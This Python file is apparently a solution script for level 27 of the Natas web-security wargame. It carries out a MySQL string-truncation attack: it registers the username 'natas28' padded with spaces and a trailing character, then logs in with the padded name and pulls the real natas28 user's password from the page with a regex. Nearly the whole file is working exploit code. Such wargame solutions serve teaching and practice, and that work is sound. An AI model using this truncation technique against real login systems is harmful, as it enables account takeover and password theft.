import re
from src.natas.base_level import NatasLevel

class Level_27(NatasLevel):

  num = 27
  explanation = "On this level, MySQL truncates strings to 64 chars when stored. We register\n     'natas28' + 57 spaces + 'x' (66 chars), which gets truncated to 'natas28' + 57 spaces.\n     Logging in with that same padded string then matches the real natas28 user, returning its password."

  def exploit(self) -> str:

    USER = "natas28" + " " * 57 + "x"
    USER_LOGIN = "natas28" + " " * 57

    self.session.post(self.base_url, data = {"username": USER, "password": "hola"})
    resp  = self.session.post(self.base_url, data = {"username": USER_LOGIN, "password": "hola"})
    match = re.search(r'\[password\] =&gt; ([a-zA-Z0-9]{32})', resp.text).group(1)

    return match
